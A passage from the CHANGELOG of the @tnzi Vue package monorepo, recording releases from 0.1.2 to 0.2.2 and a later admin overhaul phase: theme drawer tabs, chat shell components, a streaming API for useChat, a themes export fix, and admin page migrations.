  breadcrumb) and right (action buttons). Consumed by `TAdminShell` to inject
  `TAdminTopMenu` for horizontal & hybrid modes.

### Changed — `@tnzi/ui-admin`

- **`TThemeDrawer` rewritten with 5 tabs** (replaces flat section list):
  - **Appearance** — color mode (light/dark/auto), 12 preset color swatches +
    `NColorPicker` for each role (primary/info/success/warning/error). Reuses
    `@tnzi/ui`'s `useTheme()` context — no duplicate color state.
  - **Layout** — 6 mode cards, invert sider/header toggles, sider/header/tab
    sizing sliders, tab style selector, visibility & fixed-position toggles.
  - **General** — page transition on/off + transition mode selector.
  - **Watermark** — enable + text + includeUserName + includeDate + opacity +
    fontSize.
  - **Preset** — copy-to-clipboard, download .json, import from textarea,
    reset-all with confirmation popover.
- `TAdminShell` now reads `layoutMode`, `headerVisible`, `tabVisible`,
  `footerVisible`, `breadcrumbVisible`, `siderWidth`, `siderCollapsedWidth`,
  `headerHeight`, `pageTransition`, `fixedHeader`, `invertSider`,
  `invertHeader` from the store as defaults when props are not provided. This
  keeps the Settings Drawer wired-up out of the box.

### Test coverage

- `@tnzi/ui-admin` 488 → 513 tests (+25): store hybrid modes + watermark +
  tabStyle + pageAnimate + reset; `admin-config` round-trip + version guard;
  `TLayoutModeCard` render geometry + select emit; `TThemeDrawer` 5 tabs +
  snapshot + reset + translate prop.
- Existing locale + integration tests adjusted for the new `theme.*` i18n
  shape (no behavioral regression).

### Roadmap

Phase A is the first of 7 patches (0.2.3 → 0.2.9) bringing `@tnzi/ui-admin`
to production grade. Upcoming Phase B (`/admin/diagnostics/modules` driven
auto-discovery + `defineAdminApp({ hideModules, overridePages, addModules })`)
is the user-facing extensibility milestone. See
`memory/ui-admin-overhaul-plan.md` for the full 7-Phase roadmap.

## [0.2.2] — 2026-05-13 (five-package alignment + ui-ai polish)

The first release where all five `@tnzi/*` packages share the same
on-disk version. Reconciles the long-standing drift where the CHANGELOG
recorded `0.2.0-preview.1/2/3` releases that never actually bumped
`package.json` on `@tnzi/core`, `@tnzi/ui`, `@tnzi/ui-admin`,
`@tnzi/mobile`. The breaking changes described in those preview
entries (admin pages split, `@tnzi/core` per-call service factories,
theme tokens, etc.) are all already in the source tree — this release
just lets the manifest reflect reality.

Two `@tnzi/ui-ai` improvements ride along (both backward-compatible):

### Packages bumped

| Package          | From  | To    |
|------------------|-------|-------|
| `@tnzi/core`     | 0.1.4 | 0.2.2 |
| `@tnzi/ui`       | 0.1.3 | 0.2.2 |
| `@tnzi/ui-admin` | 0.1.3 | 0.2.2 |
| `@tnzi/ui-ai`    | 0.2.1 | 0.2.2 |
| `@tnzi/mobile`   | 0.1.3 | 0.2.2 |

### Added

- **`@tnzi/ui-ai` `useChat` — streaming integration API**: the composable
  now exposes `addMessage`, `updateMessage`, `appendDelta` and
  `setStreaming` from its return value. A consumer's SSE / WebSocket
  transport can feed deltas back into the reactive message list
  without re-implementing the message store. `appendDelta(id, field,
  delta)` is synchronous so high-frequency deltas never race or
  coalesce; `updateMessage` keeps the existing rAF-batched semantics.
  Covered by 7 new unit tests (useChat 15 → 22 tests; package total
  195 → 202 tests).

### Fixed

- **`@tnzi/ui-ai` themes barrel** — `import { applyAiTheme,
  lightTokens, darkTokens } from '@tnzi/ui-ai/themes'` now resolves
  to a real runtime export. Previously rollup tree-shake stripped the
  `export { … } from './tokens'` re-export line in `themes/index.ts`
  (since the named identifiers were not locally referenced), leaving
  `dist/themes/index.js` with only `applyTheme` + `resetTheme` while
  the `dist/themes/index.d.ts` still advertised the full set —
  typecheck succeeded, runtime imports got `undefined`. Fixed by
  declaring `themes` as a top-level entry in `packages/ui-ai/vite.
  config.ts` (matches the existing `chat`, `shell`, `utils`, etc.
  entries) and adding a `"./themes"` shortcut next to the existing
  `"./themes/*"` wildcard in `package.json#exports`.

### Notes

- No source-level breaking changes for any package. The five-package
  alignment is a manifest-only reconciliation; the breaking changes
  documented under `[0.2.0-preview.*]` above already landed in code
  long ago and consumers tracking `workspace:*` (which is most of
  this repo) are unaffected.
- The `@tnzi/ui-ai` `themes` exports field is additive; existing
  `@tnzi/ui-ai/themes/tokens` subpath imports keep working.

## [0.2.1] — 2026-05-13 (`@tnzi/ui-ai` only)

First **realized** version bump on disk for `@tnzi/ui-ai`. The earlier
`0.2.0-preview.1/2/3` entries in this file describe work that landed in the
source tree, but `packages/ui-ai/package.json` was never bumped past `0.1.3`
during those preview cycles. This release reconciles the manifest with the
shipped code.

The other four packages (`@tnzi/core`, `@tnzi/ui`, `@tnzi/ui-admin`,
`@tnzi/mobile`) intentionally remain on `0.1.x` for now — their preview-track
entries above are tracked as a known reconciliation item to be addressed
separately.

### Packages bumped

| Package        | From  | To    |
|----------------|-------|-------|
| `@tnzi/ui-ai`  | 0.1.3 | 0.2.1 |

### Added

- **`@tnzi/ui-ai/chat` — `TChatApp`** (~840-line SFC): a drop-in
  production-grade chat application shell with Manus-inspired visuals.
  Internally composes `TCollapsibleSidebar` + `TLandingPage` +
  `TThreadComposer` + `TReasoningStage` + `TArtifactPanel` +
  `TSettingsDialog` + `TCommandPalette`. Consumers wire data via
  `:threads` / `:messages` / `:is-streaming` / `v-model:input-text` and
  override visuals through 15+ slots (`#brand`, `#topbar-actions`,
  `#sidebar-content`, `#landing-chips`, `#composer-left`,
  `#settings-{custom-id}`, …). 20+ props · 13 events · 15+ slots.
- **Manus surface tokens** moved into `src/styles/index.css`: complete
  `--tnzi-ai-bg / text / text-secondary / text-tertiary / surface /
  border / border-strong / divider / accent / accent-soft / hover /
  press / selected / font-display / font-body / font-mono /
  duration-fast|base|slow / easing / composer-radius / composer-shadow /
  modal-radius / backdrop` palette so consumers no longer need to ship
  their own token CSS.
- **Critical Rule #0** added to `packages/ui-ai/CLAUDE.md`: new chat
  products should start with `TChatApp` and only drop down to
  `@tnzi/ui-ai/shell` + `@tnzi/ui-ai/components` when `TChatApp`
  cannot host the design.

### Removed (breaking)

- **`ChatLayout` family — 6 components hard-deleted**: `ChatLayout`,
  `ChatSidebar`, `ChatMain`, `ChatHeader`, `ChatArtifactPanel`,
  `ChatSettings`. The legacy basic layout is no longer exported from
  `@tnzi/ui-ai` or `@tnzi/ui-ai/chat`. See `MIGRATION.md` "0.2 —
  `ChatLayout` → `TChatApp`" for the upgrade path.

### Notes on SemVer

Under strict SemVer for the `0.x` line a public-export removal would
warrant a minor bump to `0.3.0`. We are using `0.2.1` here to match the
`Migration: ChatLayout → TChatApp (0.2.1)` section already documented in
`packages/ui-ai/CLAUDE.md` and to keep alignment with the unrealized
`0.2.0-preview.*` history. Consumers should treat this as a breaking
change despite the patch-level number.

### Verification

`pnpm install` resolves workspace links cleanly; `pnpm --filter
@tnzi/ui-ai build` + `typecheck` pass; the reference chat product
consumes `@tnzi/ui-ai` via `link:` and stays green
because the `TChatApp` migration in the consumer's chat shell shipped in
the same session (consumer `main` `111023c`).

## [0.2.0-preview.3] — 2026-04-14

Maintenance pre-release adding the `@tnzi/ui-ai/shell` component set.

### Packages bumped

| Package          | From               | To                 |
|------------------|--------------------|--------------------|
| `@tnzi/ui-ai`    | 0.2.0-preview.2    | 0.2.0-preview.3    |

### Added

- **`@tnzi/ui-ai/shell`** — new subpath export with three slot-driven shell components for composing a full chat application:
  - `TCollapsibleSidebar` — three-mode sidebar (expanded / icon rail / hidden) with mobile drawer auto-transition
  - `TCommandPalette` — Cmd+K action launcher with keyboard nav and hotkey binding, dependency-free substring + keyword matching
  - `TSettingsDialog` — two-column multi-section modal (section list + dynamic content slot)
- **Composables** — `useSidebarState`, `useCommandPalette`, `useSettingsDialog` (re-exported from both `@tnzi/ui-ai/composables` and `@tnzi/ui-ai/shell`).
- **Tests** — 35 new unit tests across the three composables.
- **size-limit budget** — `dist/shell.js` capped at 25 kB gzipped (current: 10.86 kB).
- **Playground rewrite** — `packages/ui-ai/playground` is now a high-fidelity chat application (deer-flow-inspired) playing 10 scripted mock scenarios (simple chat, deep reasoning, RAG lookup, code artifact, workflow DAG, skill invocation, multi-agent handoff, file attachments, message branching, embed widget). Old demo tabs (`ChatDemo`, `ComponentsDemo`, `WorkflowDemo`, `AdminDemo`, `EmbedDemo`) are removed — their content is covered by the scenario set.

### Notes

All three shell components and their composables are marked `@experimental`. The surface may iterate until 0.3.0. Shell is shipped as a dedicated library entry (`dist/shell.js`) so non-consumers see no bundle size regression.

## [0.2.0-preview.2] — 2026-04-14

Maintenance pre-release. Aligns all five packages on a single version, removes residue from the Phase 0–6 refactor, and tightens a handful of types that slipped through the original audit.

### Packages bumped

| Package          | From               | To                 |
|------------------|--------------------|--------------------|
| `@tnzi/core`     | 0.2.0-preview.2    | 0.2.0-preview.2    |
| `@tnzi/ui`       | 0.2.0-preview.1    | 0.2.0-preview.2    |
| `@tnzi/ui-admin` | 0.2.0-preview.1    | 0.2.0-preview.2    |
| `@tnzi/ui-ai`    | 0.2.0-preview.1    | 0.2.0-preview.2    |
| `@tnzi/mobile`   | 0.2.0-preview.1    | 0.2.0-preview.2    |

### Changed

- `@tnzi/ui-admin`: `pages/chat/ChatSession.vue` is now generic on `ChatSessionListItemDto` instead of `Record<string, unknown>`, removing three `as unknown as` escape hatches; the bridge already maps create/update DTOs internally.
- `@tnzi/ui`: `TSelect.vue` no longer casts its `options` prop through `as any`; the prop is already typed as `Option[]`.
- `@tnzi/ui-ai`: removed a 38-line `TODO`-tagged commented SSE block from `composables/useChat.ts` — streaming integration is intentionally delegated to the consumer via `onStreamStart` / `onStreamEnd` hooks.
- `@tnzi/mobile`: `CLAUDE.md` package-info version aligned with `package.json`.

### Removed

- `@tnzi/ui-ai`: dead `playground/tailwind.config.js` + `playground/postcss.config.js` (they imported a parent `tailwind.config.js` deleted in the UnoCSS migration). Playground devDeps `tailwindcss`/`postcss`/`autoprefixer` removed.

### Fixed

- Workspace version drift introduced when `@tnzi/core` was bumped to `0.2.0-preview.2` in isolation; consumers depending on the published versions (rather than `workspace:*`) now see a consistent set.

## [0.2.0-preview.1] — 2026-04-13

The first pre-release of the 0.2 line. Delivers the structural refactor planned in `.superpowers/specs/2026-04-12-ui-packages-production-readiness-design.md` across seven phases (0–6). Consumers upgrading from 0.1 should read [MIGRATION.md](./MIGRATION.md) first.

### Highlights

- **`@tnzi/ui-admin` preset** — new admin framework that wires routing, plugins, stores, bridges and layout in one call (`createTnziUiAdmin`).
- **Real API bridges** — 29 preset admin pages now hit real `@tnzi/core/services/*` contracts via per-module bridge factories instead of inline stubs (Phase 3).
- **13 AI admin pages** — Phase 5 migrates agents / threads / skills / workflows / providers / MCP / RAG / quota / persona / evaluations / usage pages from `@tnzi/ui-ai/admin` into `@tnzi/ui-admin`. The `@tnzi/ui-ai` package is now purely the chat + workflow editor surface.
- **Styling cleanup** — `@tnzi/ui-ai` Phase 4 removed all `cn()` utility calls and `dark:` Tailwind variants, consolidating onto `@tnzi/ui`'s theme variable system.
- **Coverage thresholds enforced** — 80% lines/statements, 70% branches across `@tnzi/ui`, `@tnzi/ui-admin`, `@tnzi/ui-ai` (function thresholds are 80% for `@tnzi/ui`, 60% for ui-admin/ui-ai with documented rationale).
- **Playwright E2E** — auth, admin CRUD, workflow lazy-load, chat themes and accessibility baseline specs (19 tests total across 5 specs).
- **Engineering baseline** — unified ESLint flat config, commitlint + simple-git-hooks, size-limit guardrail on all 3 UI packages.

### Packages bumped

| Package          | From    | To                 |
|------------------|---------|--------------------|
| `@tnzi/core`     | 0.1.2   | 0.2.0-preview.1    |
| `@tnzi/ui`       | 0.1.1   | 0.2.0-preview.1    |
| `@tnzi/ui-admin` | 0.1.0   | 0.2.0-preview.1    |
| `@tnzi/ui-ai`    | 0.1.0   | 0.2.0-preview.1    |
| `@tnzi/mobile`   | 0.1.0   | 0.2.0-preview.1    |

### Added

- **Phase 1** — new foundation:
  - `composables/{auth,data,feedback,form,theme}` subdirectory layout with typed public contracts
  - 5 component barrels (`auth`, `form`, `navigation`, `card`, `list`)
  - Plugin install flow (`createTnziUi`) augmented (not replaced) to preserve Phase 0 adapter/store wiring
- **Phase 2a** — `@tnzi/ui-admin` stores (`adminAppStore`, `adminUserStore`, `adminPermissionStore`) + i18n + theme preset wiring
- **Phase 2b** — full admin component set (28 tasks): `TAdminShell`, `TAdminHeader/Footer/Sidebar`, `TCrudPage`, `TCrudToolbar`, `TCrudColumnSetting`, `TFormModal`, `TBatchActions`, responsive breakpoint adapter, `defaultAdminRoutes` for the 29 preset pages
- **Phase 3** — 29 Phase 3 admin pages wired to real bridges: Identity (User/Role/Tenant/LoginLog/GdprRequests), Audit, System, Chat, Notification, Payment, Template, Storage, Authorization
- **Phase 4** — `@tnzi/ui-ai` styles migration: `styles/index.css` inherits from `@tnzi/ui/style.css`, consumes `--tnzi-ai-*` CSS variables, removes `cn()` + Tailwind `dark:` residue
- **Phase 5** — 13 AI admin pages migrated into `@tnzi/ui-admin`: `AgentList`, `AgentDetail`, `RunMonitor`, `SkillList`, `PersonaList`, `WorkflowEditor` (lazy-loaded via `defineAsyncComponent`), `RunViewer`, `KbManager`, `McpServerList`, `ProviderConfig`, `QuotaRules`, `UsageDashboard`, `EvalViewer`
- **Phase 6 testing** — 1663 unit tests + 20 E2E tests, coverage reports, a11y baseline via axe-core
- **Phase 6 engineering** — ESLint flat config, commitlint, size-limit, Playwright

### Changed

- `@tnzi/ui-admin/pages` now consumes bridges from `@tnzi/ui-admin/src/services/bridges/*` (not inline stubs)
- `TCrudPage` receives `useCrudPage` state via prop; previously inlined the state machine
- `@tnzi/ui-ai` components use `--tnzi-ai-*` CSS variables for theme tokens; no more Tailwind `dark:` classes
- Default controller route registration via `defaultAdminRoutes` helper
- Pinia stores use factory pattern (`useAuthStore`, `useAppStore`, `useUserStore` with `resetAuthRuntime` / `resetStoreRuntime` test helpers)
- `@tnzi/core` service factories are per-call (not singletons) — bridges must call factories lazily in each sub-contract method

### Removed

- `packages/ai/src/admin/` directory (13 pages migrated to `@tnzi/ui-admin`)
- 7 legacy scaffold pages (Phase 6.2e cleanup): `ChatManagement.vue`, `OrderManagement.vue`, `SubscriptionManagement.vue`, `StorageManager.vue`, `FunctionManagement.vue`, `PermissionManagement.vue`, `NotificationManagement.vue`
- Legacy top-level composables in `@tnzi/ui/src/composables/` (kept on disk for baseline test compat, excluded from coverage, no longer publicly exported)

### Fixed

- Phase 4 carryover: `@tailwindcss/typography` + `tailwindcss` missing from `@tnzi/ui-ai` devDeps — installed in Phase 6.6 so the playground can start
- 10 pre-existing `ui-admin` integration mount flakes (Chat/Notification/Payment/Template timeouts): root cause was 5s vitest timeout insufficient for cold-cache dynamic SFC import; raised `testTimeout` to 15s (Phase 6.2e)
- `@tnzi/core/http` `normalizeApiResult` now handles the `success` field correctly for camelCase API responses
- Auth-store `401` auto-refresh handles concurrent refresh requests with a mutex and avoids infinite loops
- GET request deduplication via in-flight promise cache (opt-in via `deduplicateGets`)

### Known issues / Phase 6 deferrals

- **Hook install on Windows** — `commit-msg` hook cwd/path handling is fragile under git-bash + pnpm; commitlint works manually (`pnpm commitlint --edit .git/COMMIT_EDITMSG`)
- **`@tnzi/ui-ai` bundle size** — 1.91 MB gzipped for the full barrel import because `@vue-flow/core` + `shiki` + `markdown-it` + `katex` are transitively pulled; consumers who don't import `WorkflowCanvas` should rely on subpath exports + tree-shaking, but full subpath export tightening is deferred to a dedicated ticket
- **`@tnzi/ui-ai` shadcn residue** — Phase 4 removed `cn()` calls + `dark:` variants, but 40 `.vue` files still hard-code shadcn Tailwind utility classes (`text-primary`, `bg-accent`, `text-muted-foreground`, `bg-background`, `hover:bg-accent/50` …) and `WorkflowEdge/Node/Connection` still inline `hsl(var(--primary))` / `hsl(var(--ring))`. The package retains `tailwindcss@^3.4`, `@tailwindcss/typography`, `tailwind.config.js` and `postcss.config.js` with the full shadcn color system. Phase 6.21 cleanup (Option A) deleted the orphan `primitives/index.ts` compat shim + `cn()` helper as low-hanging fruit; **full migration off shadcn Tailwind utility classes + `tailwind.config.js` rewrite is a multi-day post-0.2.0 backlog item**
- **A11y** — 3-4 critical/serious axe violation types per playground section remain (mostly Naive UI upstream: `aria-input-field-name`, `button-name`, `color-contrast`, `role-img-alt`, `aria-toggle-field-name`). Baseline ceiling enforced; further fixes are their own sprint
- **Bundle-split CI gate** — size-limit tracks current sizes but rollup chunk-split verification for `WorkflowCanvas` is a production-build concern (not Vite dev-mode)

## [0.1.2] — pre-Phase-6 baseline

Previous baseline. See git history for pre-0.2 changes.
